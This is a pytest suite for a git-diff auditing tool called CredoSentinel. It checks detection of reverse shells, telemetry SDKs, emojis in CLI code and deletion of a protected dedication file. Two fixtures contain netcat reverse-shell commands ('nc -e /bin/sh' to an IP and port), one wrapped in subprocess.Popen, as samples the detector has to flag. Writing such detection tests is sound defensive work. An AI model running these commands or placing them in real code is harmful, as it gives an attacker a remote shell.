"""Comprehensive Test Suite for FreeAI Credo & Sovereign Gatekeeper Sentinel.

Zero-Bug Verification:
1. Strict protection of Sacred Tribute & Michael SAGBO dedication (RULE-1)
2. Detection of hostile payloads, reverse shells, and malicious backdoors (RULE-6)
3. Detection of spyware, proprietary telemetry, and tracking beacons (RULE-3)
4. Detection of raw emojis in terminal / CLI / TUI components (RULE-4)
5. Validation that clean, Credo-compliant contributions pass 100%
6. Proper formatting of markdown audit report and Telegram alert notifications
"""

import os
import pytest
from unittest.mock import patch, MagicMock, AsyncMock
from app.security.credo_sentinel import CredoSentinel, CredoAuditFinding


class TestCredoSentinel:
    """Verifies that CredoSentinel protects FreeAI from harmful contributions."""

    @pytest.fixture
    def sentinel(self, tmp_path):
        return CredoSentinel(repo_root=str(tmp_path))

    def test_clean_audit_passes(self, sentinel):
        with patch("subprocess.run") as mock_run:
            # Mock git diff --name-status
            mock_name_status = MagicMock()
            mock_name_status.stdout = "M\tapp/core/engine.py\nA\tapp/utils/crypto.py\n"
            
            # Mock git diff -U3
            mock_diff = MagicMock()
            mock_diff.stdout = (
                "diff --git a/app/core/engine.py b/app/core/engine.py\n"
                "--- a/app/core/engine.py\n"
                "+++ b/app/core/engine.py\n"
                "@@ -10,3 +10,4 @@\n"
                "+    def compute_hash(data: bytes) -> str:\n"
                "+        return hashlib.sha256(data).hexdigest()\n"
            )
            mock_run.side_effect = [mock_name_status, mock_diff]

            result = sentinel.audit_git_diff(base_ref="origin/main", head_ref="HEAD")
            assert result["passed"] is True
            assert result["critical_count"] == 0
            assert result["high_count"] == 0
            assert "CERTIFIÉ CONFORME" in result["verdict"]

    def test_detects_hostile_reverse_shell_payload(self, sentinel):
        with patch("subprocess.run") as mock_run:
            mock_name_status = MagicMock()
            mock_name_status.stdout = "M\tapp/network/socket.py\n"
            
            mock_diff = MagicMock()
            mock_diff.stdout = (
                "diff --git a/app/network/socket.py b/app/network/socket.py\n"
                "--- a/app/network/socket.py\n"
                "+++ b/app/network/socket.py\n"
                "@@ -20,2 +20,3 @@\n"
                "+    subprocess.Popen('nc -e /bin/sh 192.168.1.100 4444', shell=True)\n"
            )
            mock_run.side_effect = [mock_name_status, mock_diff]

            result = sentinel.audit_git_diff(base_ref="origin/main", head_ref="HEAD")
            assert result["passed"] is False
            assert result["critical_count"] >= 1
            assert any(f["rule_id"] == "RULE-6-MALICIOUS-PAYLOAD" for f in result["findings"])

    def test_detects_spyware_telemetry_sdk(self, sentinel):
        with patch("subprocess.run") as mock_run:
            mock_name_status = MagicMock()
            mock_name_status.stdout = "M\tapp/main.py\n"
            
            mock_diff = MagicMock()
            mock_diff.stdout = (
                "diff --git a/app/main.py b/app/main.py\n"
                "--- a/app/main.py\n"
                "+++ b/app/main.py\n"
                "@@ -5,2 +5,3 @@\n"
                "+import sentry_sdk\n"
                "+sentry_sdk.init('https://example@sentry.io/123')\n"
            )
            mock_run.side_effect = [mock_name_status, mock_diff]

            result = sentinel.audit_git_diff(base_ref="origin/main", head_ref="HEAD")
            assert result["passed"] is False
            assert result["high_count"] >= 1
            assert any(f["rule_id"] == "RULE-3-NO-SPYWARE-TELEMETRY" for f in result["findings"])

    def test_detects_raw_emoji_in_terminal_code(self, sentinel):
        with patch("subprocess.run") as mock_run:
            mock_name_status = MagicMock()
            mock_name_status.stdout = "M\tcli.py\n"
            
            mock_diff = MagicMock()
            mock_diff.stdout = (
                "diff --git a/cli.py b/cli.py\n"
                "--- a/cli.py\n"
                "+++ b/cli.py\n"
                "@@ -50,2 +50,3 @@\n"
                "+    console.print('🚀 Lancement fusée !')\n"
            )
            mock_run.side_effect = [mock_name_status, mock_diff]

            result = sentinel.audit_git_diff(base_ref="origin/main", head_ref="HEAD")
            assert result["passed"] is False
            assert any(f["rule_id"] == "RULE-4-NO-EMOJI-TERMINAL" for f in result["findings"])

    def test_detects_sacred_tribute_deletion(self, sentinel):
        with patch("subprocess.run") as mock_run:
            mock_name_status = MagicMock()
            mock_name_status.stdout = "D\tapp/cognition/sacred_tribute.py\n"
            
            mock_diff = MagicMock()
            mock_diff.stdout = ""
            mock_run.side_effect = [mock_name_status, mock_diff]

            result = sentinel.audit_git_diff(base_ref="origin/main", head_ref="HEAD")
            assert result["passed"] is False
            assert any(f["rule_id"] == "RULE-1-SACRED-TRIBUTE" for f in result["findings"])

    def test_markdown_report_formatting(self, sentinel):
        fake_result = {
            "passed": False,
            "verdict": "VETO ÉTHIQUE",
            "base_ref": "origin/main",
            "head_ref": "HEAD",
            "touched_files_count": 2,
            "findings_count": 1,
            "critical_count": 1,
            "high_count": 0,
            "findings": [
                {
                    "rule_id": "RULE-6-MALICIOUS-PAYLOAD",
                    "severity": "CRITICAL",
                    "file": "app/evil.py",
                    "line": 42,
                    "message": "Direct socket reverse shell",
                    "sample": "nc -e /bin/sh 1.2.3.4"
                }
            ]
        }
        report = sentinel.generate_markdown_report(fake_result, pr_number=12)
        assert "# 🛡️ Rapport d'Audit" in report
        assert "RULE-6-MALICIOUS-PAYLOAD" in report
        assert "app/evil.py" in report
        assert "VETO SENTINELLE" in report

    def test_telegram_notification_dispatch(self, sentinel):
        async def _run():
            fake_result = {
                "passed": True,
                "touched_files_count": 3,
                "critical_count": 0,
                "high_count": 0,
                "findings": []
            }
            with patch.dict(os.environ, {"TELEGRAM_BOT_TOKEN": "123:ABC", "TELEGRAM_CHAT_ID": "456"}), \
                 patch("httpx.AsyncClient.post", new=AsyncMock()) as mock_post:
                await sentinel.notify_telegram_master(fake_result, pr_number=42, pr_author="Collaborateur1")
                assert mock_post.called
                args, kwargs = mock_post.call_args
                payload = kwargs.get("json", {})
                assert payload.get("chat_id") == "456"
                assert "CERTIFIÉ CONFORME AU CREDO" in payload.get("text", "")
                assert "Collaborateur1" in payload.get("text", "")
        import asyncio
        asyncio.run(_run())
